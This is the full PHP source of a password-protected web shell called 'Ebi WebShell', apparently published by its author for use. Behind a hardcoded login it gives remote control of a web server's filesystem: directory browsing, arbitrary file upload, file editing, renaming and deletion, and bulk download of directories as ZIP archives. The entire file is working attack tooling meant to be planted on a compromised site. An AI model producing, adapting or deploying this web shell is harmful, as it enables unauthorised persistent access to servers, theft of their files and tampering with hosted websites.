<?php
session_start();


define('USER', 'codebyebrahim');
define('PASS', '123');

// Simple login check
if (isset($_POST['login'])) {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';
    if ($user === USER && $pass === PASS) {
        $_SESSION['loggedin'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Invalid username or password!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['loggedin'])) {
    // Show login form
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Login - Ebi Webshell</title>
        <style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap');

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        background-color: #000;
        color: #00ff00;
        font-family: 'JetBrains Mono', monospace;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .login-box {
        background-color: #001100;
        border: 1px solid #00ff00;
        padding: 30px 40px;
        border-radius: 8px;
        box-shadow: 0 0 25px rgba(0, 255, 0, 0.5);
        width: 320px;
        text-align: center;
    }

    .login-box h2 {
        margin-bottom: 20px;
        color: #00ff00;
        font-size: 1.5rem;
        letter-spacing: 2px;
        border-bottom: 1px dashed #00ff00;
        padding-bottom: 10px;
        animation: blink 1s step-end infinite;
    }

    @keyframes blink {
        0%, 100% { opacity: 0; }
        50% { opacity: 1; }
    }

    input[type="text"],
    input[type="password"] {
        width: 100%;
        padding: 12px;
        margin: 10px 0;
        background: #000;
        color: #00ff00;
        border: 1px solid #00ff00;
        border-radius: 4px;
        font-size: 1rem;
        transition: box-shadow 0.2s;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
        outline: none;
        box-shadow: 0 0 8px #00ff00;
    }

    button {
        width: 100%;
        padding: 12px;
        background: #000;
        color: #00ff00;
        border: 1px solid #00ff00;
        border-radius: 4px;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.3s ease;
    }

    button:hover {
        background: #002200;
    }

    .error {
        color: #ff3333;
        margin-top: 15px;
        font-size: 0.9rem;
    }
</style>
    </head>
    <body>
        <div class="login-box">
            <h2><span style="animation: blink 1s step-end infinite;">▊</span> Ebi WebShell</h2>
            <style>
                @keyframes blink {
                    from, to { opacity: 0 }
                    50% { opacity: 1 }
                }
            </style>
            <form method="post" action="">
                <input type="text" name="username" placeholder="Username" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">Log In</button>
                <?php if (!empty($error)) echo "<div class='error'>$error</div>"; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}


$currentDir = isset($_POST['d']) && !empty($_POST['d']) ? base64_decode($_POST['d']) : getcwd();
$currentDir = str_replace("\\", "/", $currentDir);
$currentDir = rtrim($currentDir, '/');

function safeBase64Encode($str) {
    return base64_encode($str);
}

function safeBase64Decode($str) {
    return base64_decode($str);
}

// to download dir
if (isset($_GET['download_dir'])) {
    $dir = isset($_GET['dir']) ? base64_decode($_GET['dir']) : $currentDir;
    $zipName = "directory_download.zip";
    $zipPath = sys_get_temp_dir() . "/" . $zipName;
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($files as $file) {
            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, strlen($dir) + 1);
            if ($file->isDir()) {
                $zip->addEmptyDir($relativePath);
            } else {
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();
        header('Content-Type: application/zip');
        header("Content-Disposition: attachment; filename=$zipName");
        header("Content-Length: " . filesize($zipPath));
        readfile($zipPath);
        unlink($zipPath);
        exit;
    } else {
        echo "<script>alert('Failed to create ZIP file.');</script>";
    }
}

// File upload
if (isset($_POST['s']) && isset($_FILES['u']) && $_FILES['u']['error'] == 0) {
    $fileName = basename($_FILES['u']['name']);
    $tmpName = $_FILES['u']['tmp_name'];
    $destination = $currentDir . '/' . $fileName;
    if (move_uploaded_file($tmpName, $destination)) {
        echo "<script>alert('Upload successful!');</script>";
    } else {
        echo "<script>alert('Upload failed!');</script>";
    }
}

// File delete
if (isset($_POST['del']) && !empty($_POST['del'])) {
    $filePath = safeBase64Decode($_POST['del']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath) && unlink($filePath)) {
        echo "<script>alert('Delete successful!');</script>";
        $currentDir = $fileDir;
    } else {
        echo "<script>alert('Delete failed or no permission!');</script>";
    }
}

// File rename
if (isset($_POST['ren']) && !empty($_POST['ren'])) {
    $oldPath = safeBase64Decode($_POST['ren']);
    $oldDir = dirname($oldPath);
    if (isset($_POST['new']) && !empty($_POST['new'])) {
        $newName = basename($_POST['new']);
        $newPath = $oldDir . '/' . $newName;
        if (file_exists($oldPath) && !file_exists($newPath) && rename($oldPath, $newPath)) {
            echo "<script>alert('Rename successful!');</script>";
            $currentDir = $oldDir;
        } else {
            echo "<script>alert('Rename failed!');</script>";
        }
    } else {
        // Show rename form
        echo "<form method='post' style='margin:20px auto; width:300px; background:#1a0000; padding:20px; border-radius:6px; box-shadow:0 0 15px rgba(255,0,0,0.6);'>"
            . "<h3 style='color:#ff4d4d;'>Rename File</h3>"
            . "New name:<br><input name='new' type='text' style='width:100%; padding:8px; background:#300000; color:#ff7777; border:2px solid #ff0000; border-radius:4px;' value=''><br><br>"
            . "<input type='hidden' name='ren' value='" . htmlspecialchars($_POST['ren']) . "'>"
            . "<input type='hidden' name='d' value='" . safeBase64Encode($oldDir) . "'>"
            . "<button type='submit' style='width:100%; padding:10px; background:#ff0000; border:none; color:#000; border-radius:4px; cursor:pointer;'>Rename</button>"
            . "</form>";
        exit;
    }
}

// File edit form
if (isset($_POST['edit']) && !empty($_POST['edit'])) {
    $filePath = safeBase64Decode($_POST['edit']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath)) {
        echo "<style>table{display:none;} body { background-color: #000; color: #0f0; font-family: monospace; }</style>"
            . "<script>
                function postDir(dir) {
                    const form = document.createElement('form');
                    form.method = 'post';
                    form.action = '';
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'd';
                    input.value = btoa(dir);
                    form.appendChild(input);
                    document.body.appendChild(form);
                    form.submit();
                }
               </script>"
            . "<a href='javascript:void(0);' onclick='postDir(\"" . addslashes($fileDir) . "\")' 
                class='button1' 
                style='margin:10px; display:inline-block; padding:8px 14px; background:#000; color:#0f0; border:1px solid #0f0; border-radius:4px; text-decoration:none;'>⇦ Back</a>"
            . "<form method='post' style='margin:20px auto; width:90%; max-width:800px; background:#000; padding:20px; border-radius:6px; box-shadow:0 0 15px rgba(0,255,0,0.3);'>"
            . "<h3 style='color:#0f0; margin-bottom:10px;'>Editing: " . htmlspecialchars(basename($filePath)) . "</h3>"
            . "<textarea name='content' style='width:100%; height:400px; background:#000; color:#0f0; border:2px solid #0f0; border-radius:4px; font-family: monospace; padding:10px;'>"
            . htmlspecialchars(file_get_contents($filePath))
            . "</textarea><br><br>"
            . "<input type='hidden' name='obj' value='" . htmlspecialchars($_POST['edit']) . "'>"
            . "<input type='hidden' name='d' value='" . safeBase64Encode($fileDir) . "'>"
            . "<button type='submit' name='save' value='1' style='width:100%; padding:10px; background:#000; border:1px solid #0f0; color:#0f0; border-radius:4px; cursor:pointer;'>📄 Save File</button>"
            . "</form>";
    } else {
        echo "<script>alert('File not writable or does not exist!');</script>";
    }
    exit;
}



// Save file after editing
if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
    $filePath = safeBase64Decode($_POST['obj']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath)) {
        file_put_contents($filePath, $_POST['content']);
        echo "<script>alert('Edit successful!');</script>";
        $currentDir = $fileDir;
    } else {
        echo "<script>alert('Edit failed or no permission!');</script>";
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Ebi webshell</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap');
    body {
        background-color: #000;
        color: #00ff00;
        font-family: 'JetBrains Mono', monospace;
        margin: 0; padding: 20px;
    }
    .logout {
        text-align: right;
        margin-bottom: 10px;
    }
    .logout a, .download-all {
        color: #0f0;
        text-decoration: none;
        padding: 6px 12px;
        border: 1px solid #0f0;
        border-radius: 4px;
        margin-left: 10px;
    }
    .logout a:hover, .download-all:hover {
        background: #003300;
    }
    .dir a, td a {
        color: #0f0;
        text-decoration: none;
    }
    .dir a:hover, td a:hover {
        text-decoration: underline;
        color: #00ff00;
    }
    .upload-form input[type=file], .upload-form button {
        background-color: #000;
        color: #0f0;
        border: 1px solid #0f0;
        padding: 8px;
        margin: 5px;
        border-radius: 4px;
    }
    .upload-form button:hover {
        background: #003300;
    }
    table {
        width: 100%;
        margin-top: 20px;
        border-collapse: collapse;
        color: #0f0;
    }
    th, td {
        border: 1px solid #0f0;
        padding: 8px;
        text-align: left;
    }
    th {
        background-color: #001100;
    }
    tr:hover {
        background-color: #002200;
    }
    .button1 {
        color: #0f0;
        background: #000;
        border: 1px solid #0f0;
        padding: 4px 8px;
        margin-right: 5px;
        border-radius: 4px;
        text-decoration: none;
    }
    .button1:hover {
        background: #003300;
    }
</style>
<script>
function postDir(dir) {
    var form = document.createElement('form');
    form.method = 'post';
    form.action = '';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'd';
    input.value = btoa(dir);
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
}
function postDel(path) {
    if (confirm('Delete this file?')) {
        var form = document.createElement('form');
        form.method = 'post';
        form.action = '';
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'del';
        input.value = btoa(path);
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    }
}
function postEdit(path) {
    var form = document.createElement('form');
    form.method = 'post';
    form.action = '';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'edit';
    input.value = btoa(path);
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
}
function postRen(path, name) {
    var newName = prompt('Enter new name:', name);
    if (newName) {
        var form = document.createElement('form');
        form.method = 'post';
        form.action = '';
        var input1 = document.createElement('input');
        input1.type = 'hidden';
        input1.name = 'ren';
        input1.value = btoa(path);
        var input2 = document.createElement('input');
        input2.type = 'hidden';
        input2.name = 'new';
        input2.value = newName;
        form.appendChild(input1);
        form.appendChild(input2);
        document.body.appendChild(form);
        form.submit();
    }
}
</script>
</head>
<body>
<h2 style="text-align:center; color:#0f0; font-family:'Courier New', monospace;">
    <span style="animation: blink 1s step-end infinite;">▊</span> Ebi Web Shell
</h2>
<style>
@keyframes blink {
  from, to { opacity: 0 }
  50% { opacity: 1 }
}
</style>

<div class="logout">
    Logged in as <b><?php echo USER; ?></b> |
    <a href="?logout=1">Logout</a>
    <a class="download-all" href="?download_dir=1&dir=<?php echo urlencode(safeBase64Encode($currentDir)); ?>">Download This Directory</a>
</div>

<div class="dir">
    Path:
    <?php
    $parts = explode('/', $currentDir);
    $pathSoFar = '';
    echo "<a href=\"javascript:void(0);\" onclick=\"postDir('/')\">/</a>";
    foreach ($parts as $part) {
        if ($part === '') continue;
        $pathSoFar .= '/' . $part;
        echo " / <a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($pathSoFar) . "')\">" . htmlspecialchars($part) . "</a>";
    }
    ?>
</div>
<center>
<form class="upload-form" method="post" enctype="multipart/form-data">
    <input type="file" name="u" required>
    <input type="hidden" name="d" value="<?php echo safeBase64Encode($currentDir); ?>">
    <input type="hidden" name="s" value="1">
    <button type="submit">Upload</button>
</form>
</center>

<table>
    <tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
    <?php
    if (is_dir($currentDir) && $dh = opendir($currentDir)) {
        $files = [];
        while (($file = readdir($dh)) !== false) {
            if ($file === '.') continue;
            if ($file === '..') {
                $parent = dirname($currentDir);
                echo "<tr><td colspan='4'><a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($parent) . "')\">.. (Parent Directory)</a></td></tr>";
                continue;
            }
            $fullPath = $currentDir . '/' . $file;
            $isDir = is_dir($fullPath);
            $size = $isDir ? '-' : filesize($fullPath);
            $mod = date('Y-m-d H:i:s', filemtime($fullPath));
            $files[] = ['name'=>$file, 'path'=>$fullPath, 'dir'=>$isDir, 'size'=>$size, 'mod'=>$mod];
        }
        closedir($dh);

        // Sort directories first, then files
        usort($files, function($a, $b) {
            if ($a['dir'] == $b['dir']) return strcasecmp($a['name'], $b['name']);
            return $a['dir'] ? -1 : 1;
        });

        foreach ($files as $f) {
            $name = htmlspecialchars($f['name']);
            $encodedPath = htmlspecialchars($f['path']);
            if ($f['dir']) {
                echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($f['path']) . "')\">📁 $name</a></td><td>-</td><td>{$f['mod']}</td><td></td></tr>";
            } else {
                $sizeStr = ($f['size'] > 1024 * 1024)
                    ? round($f['size'] / (1024*1024), 2) . " MB"
                    : (($f['size'] > 1024) ? round($f['size'] / 1024, 2) . " KB" : $f['size'] . " B");

                $downloadLink = basename($encodedPath);

                echo "<tr><td><a href=\"$downloadLink\" download>" . $name . "</a></td><td>$sizeStr</td><td>{$f['mod']}</td>"
                . "<td>"
                . "<a href=\"javascript:void(0);\" class=\"button1\" onclick=\"postEdit('{$encodedPath}')\">Edit</a>"
                . "<a href=\"javascript:void(0);\" class=\"button1\" onclick=\"postRen('{$encodedPath}', '$name')\">Rename</a>"
                . "<a href=\"javascript:void(0);\" class=\"button1\" onclick=\"postDel('{$encodedPath}')\">Delete</a>"
                . "</td></tr>";
            }
        }
    } else {
        echo "<tr><td colspan='4'>Cannot open directory or no permission.</td></tr>";
    }
    ?>
</table>
<footer style="text-align:center; margin-top:40px; color:#0f0; font-family:monospace; font-size:0.9rem;">
    Designed By <b>CodeByEbrahim</b>
</footer>
</body>
</html>
